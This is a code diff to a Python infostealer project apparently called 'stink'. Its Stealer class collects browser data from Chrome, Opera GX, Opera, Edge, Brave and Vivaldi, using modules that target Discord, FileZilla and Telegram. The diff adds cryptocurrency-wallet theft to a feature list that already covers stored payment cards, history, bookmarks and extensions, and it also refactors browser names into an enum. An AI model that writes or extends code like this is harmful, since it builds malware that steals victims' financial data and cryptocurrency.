@@ -7,7 +7,7 @@ from shutil import rmtree, make_archive
 from stink.helpers import functions
 from stink.enums import Features, Utils
 from stink.utils import Autostart, Message
-from stink.helpers.config import MultistealerConfig
+from stink.helpers.config import MultistealerConfig, Browsers
 from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram
 
 
@@ -29,14 +29,15 @@ class Stealer(Thread):
             Features.cards,
             Features.history,
             Features.bookmarks,
-            Features.extensions
+            Features.extensions,
+            Features.wallets
         ] if module in features or Features.all in features]
         browser_statuses = True if len(browser_functions) > 0 else False
 
         self.__methods = [
             {
                 "object": Chromium(
-                    "Chrome",
+                    Browsers.CHROME.value,
                     self.__config.StoragePath,
                     *self.__config.ChromePaths,
                     browser_functions,
@@ -46,7 +47,7 @@ class Stealer(Thread):
             },
             {
                 "object": Chromium(
-                    "Opera GX",
+                    Browsers.OPERA_GX.value,
                     self.__config.StoragePath,
                     *self.__config.OperaGXPaths,
                     browser_functions,
@@ -56,7 +57,7 @@ class Stealer(Thread):
             },
             {
                 "object": Chromium(
-                    "Opera Default",
+                    Browsers.OPERA_DEFAULT.value,
                     self.__config.StoragePath,
                     *self.__config.OperaDefaultPaths,
                     browser_functions,
@@ -66,7 +67,7 @@ class Stealer(Thread):
             },
             {
                 "object": Chromium(
-                    "Edge",
+                    Browsers.EDGE.value,
                     self.__config.StoragePath,
                     *self.__config.MicrosoftEdgePaths,
                     browser_functions,
@@ -76,7 +77,7 @@ class Stealer(Thread):
             },
             {
                 "object": Chromium(
-                    "Brave",
+                    Browsers.BRAVE.value,
                     self.__config.StoragePath,
                     *self.__config.BravePaths,
                     browser_functions,
@@ -86,7 +87,7 @@ class Stealer(Thread):
             },
             {
                 "object": Chromium(
-                    "Vivaldi",
+                    Browsers.VIVALDI.value,
                     self.__config.StoragePath,
                     *self.__config.VivaldiPaths,
                     browser_functions,
